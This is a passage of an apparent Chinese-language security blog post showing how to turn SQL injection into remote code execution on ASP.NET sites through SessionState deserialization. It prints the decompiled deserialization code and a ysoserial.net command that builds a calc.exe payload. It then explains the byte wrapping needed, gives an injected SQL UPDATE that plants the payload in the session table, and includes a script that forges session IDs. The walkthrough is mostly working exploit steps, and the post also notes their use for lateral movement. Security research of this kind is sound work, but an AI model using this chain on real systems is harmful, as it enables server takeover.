        <span class="k">internal</span> <span class="k">static</span> <span class="n">SessionStateStoreData</span> <span class="nf">Deserialize</span><span class="p">(</span><span class="n">HttpContext</span> <span class="n">context</span><span class="p">,</span> <span class="n">Stream</span> <span class="n">stream</span><span class="p">)</span> <span class="p">{</span>
            <span class="kt">int</span>                 <span class="n">timeout</span><span class="p">;</span>
            <span class="n">SessionStateItemCollection</span>   <span class="n">sessionItems</span><span class="p">;</span>
            <span class="kt">bool</span>                <span class="n">hasItems</span><span class="p">;</span>
            <span class="kt">bool</span>                <span class="n">hasStaticObjects</span><span class="p">;</span>
            <span class="n">HttpStaticObjectsCollection</span> <span class="n">staticObjects</span><span class="p">;</span>
            <span class="n">Byte</span>                <span class="n">eof</span><span class="p">;</span>

            <span class="k">try</span> <span class="p">{</span>
                <span class="n">BinaryReader</span> <span class="n">reader</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">BinaryReader</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
                <span class="n">timeout</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="nf">ReadInt32</span><span class="p">();</span>
                <span class="n">hasItems</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="nf">ReadBoolean</span><span class="p">();</span>
                <span class="n">hasStaticObjects</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="nf">ReadBoolean</span><span class="p">();</span>

                <span class="k">if</span> <span class="p">(</span><span class="n">hasItems</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">sessionItems</span> <span class="p">=</span> <span class="n">SessionStateItemCollection</span><span class="p">.</span><span class="nf">Deserialize</span><span class="p">(</span><span class="n">reader</span><span class="p">);</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="n">sessionItems</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">SessionStateItemCollection</span><span class="p">();</span>
                <span class="p">}</span>

                <span class="k">if</span> <span class="p">(</span><span class="n">hasStaticObjects</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">staticObjects</span> <span class="p">=</span> <span class="n">HttpStaticObjectsCollection</span><span class="p">.</span><span class="nf">Deserialize</span><span class="p">(</span><span class="n">reader</span><span class="p">);</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="n">staticObjects</span> <span class="p">=</span> <span class="n">SessionStateUtility</span><span class="p">.</span><span class="nf">GetSessionStaticObjects</span><span class="p">(</span><span class="n">context</span><span class="p">);</span>
                <span class="p">}</span>

                <span class="n">eof</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="nf">ReadByte</span><span class="p">();</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">eof</span> <span class="p">!=</span> <span class="m">0xff</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">throw</span> <span class="k">new</span> <span class="nf">HttpException</span><span class="p">(</span><span class="n">SR</span><span class="p">.</span><span class="nf">GetString</span><span class="p">(</span><span class="n">SR</span><span class="p">.</span><span class="n">Invalid_session_state</span><span class="p">));</span>
                <span class="p">}</span>
            <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">EndOfStreamException</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nf">HttpException</span><span class="p">(</span><span class="n">SR</span><span class="p">.</span><span class="nf">GetString</span><span class="p">(</span><span class="n">SR</span><span class="p">.</span><span class="n">Invalid_session_state</span><span class="p">));</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">new</span> <span class="nf">SessionStateStoreData</span><span class="p">(</span><span class="n">sessionItems</span><span class="p">,</span> <span class="n">staticObjects</span><span class="p">,</span> <span class="n">timeout</span><span class="p">);</span>
        <span class="p">}</span>
    
        <span class="k">static</span> <span class="k">internal</span> <span class="n">SessionStateStoreData</span> <span class="nf">DeserializeStoreData</span><span class="p">(</span><span class="n">HttpContext</span> <span class="n">context</span><span class="p">,</span> <span class="n">Stream</span> <span class="n">stream</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">compressionEnabled</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="n">SessionStateUtility</span><span class="p">.</span><span class="nf">Deserialize</span><span class="p">(</span><span class="n">context</span><span class="p">,</span> <span class="n">stream</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>我們可以看到實際上 DeserializeStoreData 又是把反序列化過程轉交給其他類別，而依據取出的資料不同，可能會轉交給 <code class="language-plaintext highlighter-rouge">SessionStateItemCollection.Deserialize</code> 或 <code class="language-plaintext highlighter-rouge">HttpStaticObjectsCollection.Deserialize</code> 做處理，在觀察程式碼後發現 <code class="language-plaintext highlighter-rouge">HttpStaticObjectsCollection</code> 的處理相對單純，所以我個人就選擇往這個分支下去研究。</p>

<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">namespace</span> <span class="nn">System.Web</span> <span class="p">{</span>
    <span class="k">public</span> <span class="k">sealed</span> <span class="k">class</span> <span class="nc">HttpStaticObjectsCollection</span> <span class="p">:</span> <span class="n">ICollection</span> <span class="p">{</span>
        <span class="k">static</span> <span class="k">public</span> <span class="n">HttpStaticObjectsCollection</span> <span class="nf">Deserialize</span><span class="p">(</span><span class="n">BinaryReader</span> <span class="n">reader</span><span class="p">)</span> <span class="p">{</span>
            <span class="kt">int</span>     <span class="n">count</span><span class="p">;</span>
            <span class="kt">string</span>  <span class="n">name</span><span class="p">;</span>
            <span class="kt">string</span>  <span class="n">typename</span><span class="p">;</span>
            <span class="kt">bool</span>    <span class="n">hasInstance</span><span class="p">;</span>
            <span class="n">Object</span>  <span class="n">instance</span><span class="p">;</span>
            <span class="n">HttpStaticObjectsEntry</span>  <span class="n">entry</span><span class="p">;</span>
            <span class="n">HttpStaticObjectsCollection</span> <span class="n">col</span><span class="p">;</span>

            <span class="n">col</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">HttpStaticObjectsCollection</span><span class="p">();</span>

            <span class="n">count</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="nf">ReadInt32</span><span class="p">();</span>
            <span class="k">while</span> <span class="p">(</span><span class="n">count</span><span class="p">--</span> <span class="p">&gt;</span> <span class="m">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">name</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="nf">ReadString</span><span class="p">();</span>
                <span class="n">hasInstance</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="nf">ReadBoolean</span><span class="p">();</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">hasInstance</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">instance</span> <span class="p">=</span> <span class="n">AltSerialization</span><span class="p">.</span><span class="nf">ReadValueFromStream</span><span class="p">(</span><span class="n">reader</span><span class="p">);</span>
                    <span class="n">entry</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">HttpStaticObjectsEntry</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">instance</span><span class="p">,</span> <span class="m">0</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">else</span> <span class="p">{</span>
                    <span class="c1">// skipped</span>
                <span class="p">}</span>
                <span class="n">col</span><span class="p">.</span><span class="n">_objects</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">entry</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="k">return</span> <span class="n">col</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>跟進去一看，發現 HttpStaticObjectsCollection 取出一些 bytes 之後，又把過程轉交給 <code class="language-plaintext highlighter-rouge">AltSerialization.ReadValueFromStream</code> 進行處理，看到這的朋友們或許會臉上三條線地心想：「該不會又要追進去吧 . . 」，不過其實到此為止就已足夠，因為 AltSerialization 實際上類似於 BinaryFormatter 的包裝，到此已經有足夠資訊作利用，另外還有一個原因兼好消息，當初我程式碼追到此處時，上網一查這個物件，發現 <a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a> 已經有建立 AltSerialization 反序列化 payload 的 plugin，所以可以直接掏出這個利器來使用！下面一行指令就可以產生執行系統指令 calc.exe 的 base64 編碼後的 payload。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ysoserial.exe <span class="nt">-p</span> Altserialization <span class="nt">-M</span> HttpStaticObjectsCollection <span class="nt">-o</span> <span class="nb">base64</span> <span class="nt">-c</span> <span class="s2">"calc.exe"</span>
</code></pre></div></div>

<p>不過到此還是有個小問題需要解決，ysoserial.net 的 AltSerialization plugin 所建立的 payload 是攻擊 SessionStateItemCollection 或 HttpStaticObjectsCollection 兩個類別的反序列化操作，而我們儲存在資料庫中的 session 序列化資料是由在此之上還額外作了一層包裝的 SessionStateUtility 類別處理的，所以必須要再做點修飾。回頭再去看看程式碼，會發現 SessionStateUtility 也只添加了幾個 bytes，減化後如下所示：</p>

<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">timeout</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="nf">ReadInt32</span><span class="p">();</span>
<span class="n">hasItems</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="nf">ReadBoolean</span><span class="p">();</span>
<span class="n">hasStaticObjects</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="nf">ReadBoolean</span><span class="p">();</span>

<span class="k">if</span> <span class="p">(</span><span class="n">hasStaticObjects</span><span class="p">)</span>
    <span class="n">staticObjects</span> <span class="p">=</span> <span class="n">HttpStaticObjectsCollection</span><span class="p">.</span><span class="nf">Deserialize</span><span class="p">(</span><span class="n">reader</span><span class="p">);</span>

<span class="n">eof</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="nf">ReadByte</span><span class="p">();</span>
</code></pre></div></div>

<p>對於 Int32 要添加 4 個 bytes，Boolean 則是 1 個 byte，而因為要讓程式路徑能進入 HttpStaticObjectsCollection 的分支，必須讓第 6 個 byte 為 1 才能讓條件達成，先將原本從 ysoserial.net 產出的 payload 從 base64 轉成 hex 表示，再前後各別添加 6、1 bytes，如下示意圖：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  timeout    false  true            HttpStaticObjectsCollection             eof
┌─────────┐  ┌┐     ┌┐    ┌───────────────────────────────────────────────┐ ┌┐
00 00 00 00  00     01    010000000001140001000000fff ... 略 ... 0000000a0b ff
</code></pre></div></div>

<p>修飾完的這個 payload 就能用來攻擊 SessionStateUtility 類別了！</p>

<p>最後的步驟就是利用開頭的 SQL Injection 將惡意的序列化內容注入進去資料庫，如果正常瀏覽目標網站時有出現 ASP.NET_SessionId 的 Cookie 就代表已經有一筆對應的 Session 記錄儲存在資料庫裡，所以我們只需要執行如下的 SQL Update 語句：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?id=1; UPDATE ASPState.dbo.ASPStateTempSessions
       SET SessionItemShort = 0x{Hex_Encoded_Payload}
       WHERE SessionId LIKE '{ASP.NET_SessionId}%25'; --
</code></pre></div></div>

<p>分別將 <code class="language-plaintext highlighter-rouge">{ASP.NET_SessionId}</code> 替換成自己的 ASP.NET_SessionId 的 Cookie 值以及 <code class="language-plaintext highlighter-rouge">{Hex_Encoded_Payload}</code> 替換成前面準備好的序列化 payload 即可。</p>

<p>那假如沒有 ASP.NET_SessionId 怎麼辦？這表示目標可能還未儲存任何資料在 Session 之中，所以也就不會產生任何記錄在資料庫裡，但既然沒有的話，那我們就硬塞一個 Cookie 給它！ASP.NET 的 SessionId 是透過亂數產生的 24 個字元，但使用了客製化的字元集，可以直接使用以下的 Python script 產生一組 SessionId，例如：plxtfpabykouhu3grwv1j1qw，之後帶上 <code class="language-plaintext highlighter-rouge">Cookie: ASP.NET_SessionId=plxtfpabykouhu3grwv1j1qw</code> 瀏覽任一個 aspx 頁面，理論上 ASP.NET 就會自動在資料庫裡添加一筆記錄。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">random</span>
<span class="n">chars</span> <span class="o">=</span> <span class="s">'abcdefghijklmnopqrstuvwxyz012345'</span>
<span class="k">print</span><span class="p">(</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">24</span><span class="p">)))</span>
</code></pre></div></div>

<p>假如在資料庫裡仍然沒有任何記錄出現，那就只能手動刻 INSERT 的 SQL 來創造一個記錄，至於如何刻出這部分？只要看看程式碼應該就可以很容易構造出來，所以留給大家自行去玩 :P</p>

<p>等到 Payload 順利注入後，只要再次用這個 Cookie <code class="language-plaintext highlighter-rouge">ASP.NET_SessionId=plxtfpabykouhu3grwv1j1qw</code> 瀏覽任何一個 aspx 頁面，就會觸發反序列化執行任意系統指令！</p>

<p>題外話，利用 SessionState 的反序列化取得 ASP.NET 網站應用程式主機控制權的場景並不僅限於 SQL Injection。在內網滲透測試的過程中，經常會遇到的情境是，我們透過各方的資訊洩漏 ( 例如：內部 GitLab、任意讀檔等 ) 取得許多 SQL Server 的帳號、密碼，但唯獨取得不了目標 ASP.NET 網站應用程式的 Windows 主機的帳號密碼，而為了達成目標 ( 控制指定的網站主機 )，我們就曾經使用過這個方式取得目標的控制權，所以作為內網橫向移動的手段也是稍微有價值且非常有趣。至於還能有什麼樣的花樣與玩法，就要靠各位持續地發揮想像力！</p>

                    </div>
                    <!-- 文章內容 -->
                </div>
            </article>
            <!-- 文章 end -->
        </section>
        
         <!-- 作者 -->
        <section>
            <div class="container article_footer">
                <div class="author_info">
                    <a href="/blog/author/cyku">
                        <div class="circle" style="background-image: url(/assets/img/avatar/orig/cyku.png);"></div>
                    </a>
                    <div>
                        <a class="author" href="/blog/author/cyku">
                            <h3>Cyku</h3>
                        </a>
                        <span>Senior Red Team Specialist</span>
                        <p>
                            一位熱愛網站應用程式安全技術的夢想家，<br />專長於滲透測試，夢想是成為光之美少女。
                        </p>
                    </div>
                </div>
            </div>
        </section>
        

        <!-- 相關文章 -->
        <section class="recommand articles-list">
            <div class="container">
              
                <!-- 相關文章 Item -->
                <article class="article">
                    <div class="content">
                        <a class="category" href="/blog/category/技術專欄">技術專欄</a>
                        <span class="tag">
    
                          <a href="/blog/tag/Deserialize/">#Deserialize</a> <a href="/blog/tag/RCE/">#RCE</a> 
                        </span>
                        <h2>
                            <a href="/blog/2023/09/18/hitcon-2023-devcore-wargame-my-todolist-writeup/">HITCON 2023 x DEVCORE Wargame: My todolist Write-up</a> 
                        </h2>
                    
                    
                        <a class="author" href="/blog/author/cyku">
                            <h3>cyku</h3>
                        </a>
                    
                        <span class="date">2023-09-18</span>
                        <p class="line-litmit-3">HITCON 2023 x DEVCORE Wargame 最高分題 My todolist 出題概念及解答。從結論而言，這是一個簡單的 Json.NET 反序列化漏洞的白箱題目...
                        </p>
                    </div>
                </article>
              
                <!-- 相關文章 Item -->
                <article class="article">
                    <div class="content">
                        <a class="category" href="/blog/category/最新消息">最新消息</a>
                        <span class="tag">
    
                          <a href="/blog/tag/公告/">#公告</a> <a href="/blog/tag/資安人才/">#資安人才</a> 
                        </span>
                        <h2>
                            <a href="/blog/2023/08/30/2023-devcore-cybersecurity-scholarship-application-opens/">視人才培育為己任　DEVCORE 全國資訊安全獎學金、資安教育活動贊助計畫即日起開放報名</a> 
                        </h2>
                    
                    
                        <span class="date">2023-08-30</span>
                        <p class="line-litmit-3">DEVCORE 秉持著提升台灣資安競爭力、讓世界更安全的初衷，將人才培育視為己任，透過參與教育部資安人才培育計畫、創辦 DEVCORE 實習生計畫、啟動戴夫寇爾資安獎學金、辦理資安教育活動贊助計畫等方式，協助資安人才茁壯成長。
                        </p>
                    </div>
                </article>
              
                <!-- 相關文章 Item -->
                <article class="article">
                    <div class="content">
                        <a class="category" href="/blog/category/最新消息">最新消息</a>
                        <span class="tag">
    
                          <a href="/blog/tag/公告/">#公告</a> <a href="/blog/tag/徵才/">#徵才</a> 
                        </span>
                        <h2>
                            <a href="/blog/2023/07/18/4nd-internship-program-recruit/">DEVCORE 2023 第四屆實習生計畫</a> 
                        </h2>
                    
                    
                        <span class="date">2023-07-18</span>
                        <p class="line-litmit-3">DEVCORE 第四屆實習生計畫開始，計畫目的希望能培育人才、增強新世代的資安技能，如果您對這個計畫有興趣，歡迎來信報名！
                        </p>
                    </div>
                </article>
              

            </div>
        </section>
    </div>

    <!-- footer -->
    <footer>
<div class="container footer">
    <div class="logo">
        <a href="/">
            <img src="/images/logo.svg"/>
        </a>
        <div class="social">
            <a href="https://www.facebook.com/D3VC0RE"><i class="icon facebook"></i></a>
            <a href="https://twitter.com/d3vc0r3"><i class="icon twitter"></i></a>
        </div>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">服務</h6>
        <ul>
            <li><a href="/services/red-team/">紅隊演練</a></li>
            <li><a href="/services/penetration-test/">滲透測試</a></li>
            <li><a href="/services/security-consulting/">資安顧問服務</a></li>
            <li><a href="/services/security-training/">資安教育訓練</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">研究</h6>
        <ul>
            <li><a href="/research/overview/">總覽概要</a></li>
            <li><a href="/research/awards/">競賽與獎項</a></li>
            <li><a href="/research/bug-bounty/">企業漏洞回報</a></li>
            <li><a href="/research/talks/">國際研討會</a></li>
            <li><a href="/research/cve/">CVE 漏洞列表</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">公司</h6>
        <ul>
            <li><a href="/company/about/">公司簡介</a></li>
            <li><a href="/company/our-team/">團隊成員</a></li>
            <li><a href="/company/history/">成就與沿革</a></li>
            <li><a href="/company/csr/">企業社會責任</a></li>
            <li><a href="/company/jobs/">工作機會</a></li>
            <li><a href="/contact/">聯絡我們</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">新聞</h6>
        <ul>
            <li><a href="/blog/">BLOG</a></li>
            <li><a href="/media-kit/">媒體素材下載</a></li>
        </ul>
    </div>

    <!-- divider 分隔線 -->
    <div class="divider"></div>

    <div class="copyright">
        <div class="info">
            <span>© 2023 DEVCORE 戴夫寇爾股份有限公司. <b class="line-block">All right reserved.</b></span>
            <span><a href="/privacy-policy/">Privacy Policy</a></span>
        </div>
        <div class="lang">
            <!-- <i class="icon translate"></i>
            <select>
                <option value="">Language</option>
                <option value="">中文</option>
                <option value="">English</option>
            </select> -->
            <span>Language :<a href="/">中文</a>|<a href="/en/">English</a></span>
        </div>
    </div>

</div>
    </footer>
</body>
</html>

